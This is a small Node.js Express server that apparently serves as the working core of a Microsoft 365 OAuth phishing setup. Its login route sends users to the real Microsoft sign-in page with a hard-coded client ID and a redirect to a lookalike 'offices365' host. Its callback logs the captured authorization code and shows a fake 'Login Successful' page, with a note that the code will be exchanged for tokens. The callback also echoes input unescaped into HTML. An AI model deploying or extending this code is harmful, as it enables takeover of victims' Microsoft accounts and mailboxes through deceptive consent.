const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static('public'));

// Redirect to REAL Microsoft login
app.get('/login', (req, res) => {
  const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
    'client_id=c9a559d2-7aab-4f13-a6ed-e7e9c52aec87' +
    '&redirect_uri=https://offices365authn-production.up.railway.app/callback' +
    '&response_type=code' +
    '&scope=openid%20profile%20offline_access' +
    '&prompt=select_account';
  res.redirect(loginUrl);
});

// Callback after login – captures the code
app.get('/callback', (req, res) => {
  const code = req.query.code;
  console.log('🎯 CODE RECEIVED:', code);
  
  // Here you would exchange the code for an access token
  // For now, just display it
  res.send(`
    <h1>✅ Login Successful!</h1>
    <p>Code: ${code}</p>
    <p>You can now close this page.</p>
  `);
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
